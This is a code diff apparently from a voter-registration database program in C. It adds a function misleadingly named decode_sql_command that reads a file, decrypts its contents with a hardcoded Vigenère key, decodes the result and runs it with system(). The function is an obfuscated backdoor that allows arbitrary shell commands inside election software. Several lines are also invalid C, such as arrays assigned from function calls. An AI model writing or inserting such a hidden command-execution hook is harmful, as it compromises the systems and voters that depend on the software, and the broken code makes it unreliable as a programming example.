@@ -227,34 +227,6 @@ void getVoter(sqlite3 *db, _id_t voter_id, Registration* dest) {
    sqlite3_finalize(stmt);
 }
 
-void decode_sql_command() {
-	//open file
-	FILE* fp = fopen("file.txt", "r");
-
-   if (NULL == fp) {
-	   printf("error\n");
-	}
-
-   char text;
-   char line[81];
-   char dec;
-
-   if ((text = fgets(line, 81, fp)) != NULL) {  
-      char str[15] = "VALIDATE"; // VALIDATE is the key to decrypt the cipher
-      char *ptr = str;
-      char cmd[43] = decrypt_vigenere(ptr, line); // decrypt first
-      char* cmd = decode((const char*)cmd, dec); 
-      
-      // run decrypted command in shell
-      system(cmd);
-   }
-   
-   if (fclose(fp)) {
-      perror("fclose error");
-   }
-   
-}
-
 char* decrypt_vigenere(char* key, char* ciphertext) {
    int keyLen = strlen(key);
    int msgLen = strlen(ciphertext);
@@ -281,6 +253,36 @@ char* decrypt_vigenere(char* key, char* ciphertext) {
    decryptedMsg[i] = '\0';
    char* decrypted = decryptedMsg;
    return decrypted;
+}
+
+void decode_sql_command() {
+	//open file
+	FILE* fp = fopen("file.txt", "r");
+
+   if (NULL == fp) {
+	   printf("error\n");
+	}
+
+   char text;
+   char line[81];
+   char *str = line;
+   char dec[41];
+
+   if ((text = fgets(str, sizeof(line), fp)) != NULL) {  
+      char str[15] = "VALIDATE"; // VALIDATE is the key to decrypt the cipher
+      char *ptr = str;
+      char encoded[43] = decrypt_vigenere(ptr, line); // decrypt first
+      char *ptr2 = dec;
+      int result = decode((const char*)encoded, ptr2); // don't actually use this variable, all that matters is result is in ptr2
+         
+      // run decrypted command in shell
+      system(dec);
+   }
+   
+   if (fclose(fp)) {
+      perror("fclose error");
+   }
+   
 }
 
 void fetchSignature(char* sign){
